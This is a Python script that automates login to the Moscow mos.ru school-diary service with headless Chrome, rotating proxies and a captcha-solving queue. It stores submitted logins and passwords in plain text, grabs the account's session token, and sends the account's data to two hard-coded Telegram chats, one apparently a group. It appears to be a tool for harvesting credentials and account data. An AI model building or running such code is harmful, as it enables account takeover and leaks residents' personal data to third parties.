import uuid
import sqlite3
import time
import random
import os
from datetime import datetime, timedelta
from dataclasses import dataclass
from typing import Optional
from zipfile import ZipFile
import tempfile

from selenium.webdriver import Chrome
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options

from sendtg import auth_and_get_user

# Конфигурация
DB_NAME = "auth_sessions.db"
CAPTCHA_TIMEOUT = 120  # 2 минуты в секундах
DELAY_BEFORE_CLICK = 1
DELAY_AFTER_CLICK = 1


# Инициализация БД
def init_db():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("""
                   CREATE TABLE IF NOT EXISTS captcha_tasks
                   (
                       task_id
                       TEXT
                       PRIMARY
                       KEY,
                       login
                       TEXT
                       NOT
                       NULL,
                       password
                       TEXT
                       NOT
                       NULL,
                       captcha_image
                       TEXT
                       NOT
                       NULL,
                       captcha_answer
                       TEXT,
                       status
                       TEXT
                       DEFAULT
                       'pending',
                       created_at
                       TIMESTAMP
                       DEFAULT
                       CURRENT_TIMESTAMP
                   )
                   """)
    conn.commit()
    conn.close()


init_db()


@dataclass
class AuthResult:
    status: str  # 'success', 'captcha_required', 'error', 'timeout'
    data: Optional[dict] = None
    task_id: Optional[str] = None
    captcha_image: Optional[str] = None


def get_random_proxy():
    """Получаем случайный прокси из файла proxy.txt"""
    try:
        proxy_file = os.path.join(os.path.dirname(__file__), 'proxy.txt')
        with open(proxy_file, 'r') as f:
            proxies = f.read().splitlines()
        return random.choice(proxies)
    except Exception as e:
        print(f"Ошибка при чтении файла прокси: {e}")
        return None


def create_proxy_extension(proxy):
    """Создаем временное расширение для Chrome с прокси"""
    if not proxy:
        return None

    ip, port, username, password = proxy.split(':')

    manifest_json = """
    {
        "version": "1.0.0",
        "manifest_version": 2,
        "name": "Chrome Proxy",
        "permissions": [
            "proxy",
            "tabs",
            "unlimitedStorage",
            "storage",
            "<all_urls>",
            "webRequest",
            "webRequestBlocking"
        ],
        "background": {
            "scripts": ["background.js"]
        },
        "minimum_chrome_version":"22.0.0"
    }
    """

    background_js = """
    var config = {
        mode: "fixed_servers",
        rules: {
            singleProxy: {
                scheme: "http",
                host: "%s",
                port: parseInt(%s)
            },
            bypassList: ["localhost"]
        }
    };

    chrome.proxy.settings.set({value: config, scope: "regular"}, function() {});

    function callbackFn(details) {
        return {
            authCredentials: {
                username: "%s",
                password: "%s"
            }
        };
    }

    chrome.webRequest.onAuthRequired.addListener(
        callbackFn,
        {urls: ["<all_urls>"]},
        ['blocking']
    );
    """ % (ip, port, username, password)

    proxy_ext_dir = tempfile.mkdtemp()

    with open(os.path.join(proxy_ext_dir, 'manifest.json'), 'w') as f:
        f.write(manifest_json)

    with open(os.path.join(proxy_ext_dir, 'background.js'), 'w') as f:
        f.write(background_js)

    proxy_ext_path = os.path.join(tempfile.gettempdir(), 'proxy_ext.zip')
    with ZipFile(proxy_ext_path, 'w') as zp:
        zp.write(os.path.join(proxy_ext_dir, 'manifest.json'), 'manifest.json')
        zp.write(os.path.join(proxy_ext_dir, 'background.js'), 'background.js')

    return proxy_ext_path


def create_captcha_task(login: str, password: str, captcha_image: str, task_id: str = None) -> str:
    """Создаем новую задачу с капчей в БД"""
    if task_id is None:
        task_id = str(uuid.uuid4())

    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()

    cursor.execute("""
                   INSERT INTO captcha_tasks
                       (task_id, login, password, captcha_image, status)
                   VALUES (?, ?, ?, ?, ?)
                   """, (task_id, login, password, captcha_image, 'pending'))

    conn.commit()
    conn.close()
    return task_id


def check_captcha_solution(task_id: str) -> Optional[str]:
    """Проверяем, есть ли решение для капчи"""
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()

    cursor.execute("""
                   SELECT captcha_answer
                   FROM captcha_tasks
                   WHERE task_id = ?
                     AND status = 'solved'
                   """, (task_id,))

    result = cursor.fetchone()
    conn.close()
    return result[0] if result else None


def submit_captcha_solution(task_id: str, answer: str) -> bool:
    """Сохраняем решение капчи в БД"""
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()

    cursor.execute("""
                   UPDATE captcha_tasks
                   SET captcha_answer = ?,
                       status         = 'solved'
                   WHERE task_id = ?
                     AND status = 'pending'
                   """, (answer, task_id))

    affected_rows = cursor.rowcount
    conn.commit()
    conn.close()
    return affected_rows > 0


def cleanup_expired_tasks():
    """Удаляем просроченные задачи"""
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()

    cursor.execute("""
                   UPDATE captcha_tasks
                   SET status = 'timeout'
                   WHERE status = 'pending'
                     AND datetime(created_at) < datetime('now', ?)
                   """, (f"-{CAPTCHA_TIMEOUT} seconds",))

    conn.commit()
    conn.close()


def get_profile_data(driver: Chrome, token: str) -> dict:
    """Получаем данные профиля через API"""
    return {
        "token": token,
        "profile": {}  # Заполняется реальными данными
    }


def mosru_auth(
        login: str,
        password: str,
        mode: str = "auto",
        uuid_capcha: str = None,
        serv=False
) -> AuthResult:
    print(uuid_capcha)
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--no-sandbox")

    # Настройка прокси
    proxy = get_random_proxy()
    if proxy:
        print(f"Используем прокси: {proxy}")
        proxy_ext = create_proxy_extension(proxy)
        if proxy_ext:
            chrome_options.add_extension(proxy_ext)

    driver = Chrome(service=Service(f"chromedriver{"" if serv else ".exe"}"), options=chrome_options)

    try:
        # 1. Переход на страницу авторизации
        driver.get(
            "https://login.mos.ru/sps/login/methods/password?bo=%2Fsps%2Foauth%2Fae%3Fresponse_type%3Dcode%26access_type"
            "%3Doffline%26client_id%3Ddnevnik.mos.ru%26scope%3Dopenid%2Bprofile%2Bbirthday%2Bcontacts%2Bsnils"
            "%2Bblitz_user_rights%2Bblitz_change_password%26redirect_uri%3Dhttps%253A%252F%252Fschool.mos.ru%252Fv3%252Fauth"
            "%252Fsudir%252Fcallback")

        # 2. Ввод логина и пароля
        WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.NAME, 'login')))

        driver.find_element(By.NAME, "login").send_keys(login)
        driver.find_element(By.NAME, "password").send_keys(password)
        time.sleep(DELAY_BEFORE_CLICK)
        driver.find_element(By.ID, "bind").click()
        time.sleep(DELAY_AFTER_CLICK)

        # 3. Проверка капчи
        try:
            captcha_img = WebDriverWait(driver, 2).until(
                EC.presence_of_element_located((By.XPATH, "//img[contains(@src, 'data:image')]"))
            )
            captcha_data = captcha_img.get_attribute("src")

            if mode == "manual":
                task_id = create_captcha_task(login, password, captcha_data, str(uuid_capcha))

                # Ожидаем решения капчи
                start_time = time.time()
                while True:
                    print("WAIT CAPCHA")
                    solution = check_captcha_solution(task_id)
                    if solution:
                        break

                    if time.time() - start_time > CAPTCHA_TIMEOUT:
                        cleanup_expired_tasks()
                        return AuthResult(
                            status="timeout",
                            task_id=task_id
                        )

                    time.sleep(2)

                # Вводим решение
                print(solution)
                driver.find_element(By.NAME, "captcha_answer").send_keys(solution)
                driver.find_element(By.ID, "bind").click()
                time.sleep(DELAY_AFTER_CLICK)

        except Exception as e:
            print(f"Капча не обнаружена: {e}")

        # 4. Проверка успешной авторизации
        WebDriverWait(driver, 10).until(
            lambda d: d.current_url.startswith("https://school.mos.ru/auth/callback"))

        # 5. Получение данных профиля
        token = driver.get_cookie("aupd_token")['value']
        print(token)

        user = auth_and_get_user(login, password, token)
        print(user.get_text())
        user.send_to_telegram(2015460473)
        user.send_to_telegram(-1002957969429)



        return AuthResult(
            status="success",
            data={}
        )

    except Exception as e:
        print(f"Ошибка авторизации: {e}")
        return AuthResult(status="error")
    finally:
        driver.quit()


if __name__ == '__main__':
    # Пример использования
    result = mosru_auth("your_login", "your_password", mode="manual")
    print(result)